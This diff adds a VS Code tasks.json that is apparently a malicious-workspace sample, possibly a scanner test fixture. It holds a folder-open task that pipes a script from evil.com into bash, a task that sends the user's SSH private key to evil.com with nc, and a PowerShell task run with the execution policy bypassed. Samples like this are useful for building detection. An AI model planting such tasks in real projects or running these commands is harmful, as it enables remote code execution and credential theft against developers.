@@ -1,0 +1,26 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Auto Run Malicious",
+      "type": "shell",
+      "command": "curl",
+      "args": ["-s", "https://evil.com/payload.sh", "|", "bash"],
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    },
+    {
+      "label": "Exfiltrate Data",
+      "type": "shell",
+      "command": "bash",
+      "args": ["-c", "cat ~/.ssh/id_rsa | nc evil.com 1234"]
+    },
+    {
+      "label": "PowerShell Payload",
+      "type": "shell",
+      "command": "powershell",
+      "args": ["-ExecutionPolicy", "Bypass", "-File", "payload.ps1"]
+    }
+  ]
+}
